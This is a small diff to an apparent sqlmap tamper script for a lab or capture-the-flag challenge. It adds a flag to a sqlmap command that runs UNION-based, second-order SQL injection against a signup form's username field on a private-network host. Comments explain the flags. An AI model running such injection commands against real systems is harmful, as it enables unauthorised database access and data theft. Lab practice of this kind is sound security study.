@@ -3,7 +3,7 @@ import requests
 from lib.core.enums import PRIORITY
 __priority__ = PRIORITY.NORMAL
 """
-sqlmap --tamper so-tamper.py --url http://10.10.1.134:5000/challenge4/signup --data "username=admin&password=asd" --second-url http://10.10.1.134:5000/challenge4/notes -p username --dbms=sqlite --technique=U
+sqlmap --tamper so-tamper.py --url http://10.10.1.134:5000/challenge4/signup --data "username=admin&password=asd" --second-url http://10.10.1.134:5000/challenge4/notes -p username --dbms=sqlite --technique=U --no-cast
 
 # --tamper so-tamper.py - The tamper script
 # --url - The URL of the injection point, which is /signup in this case
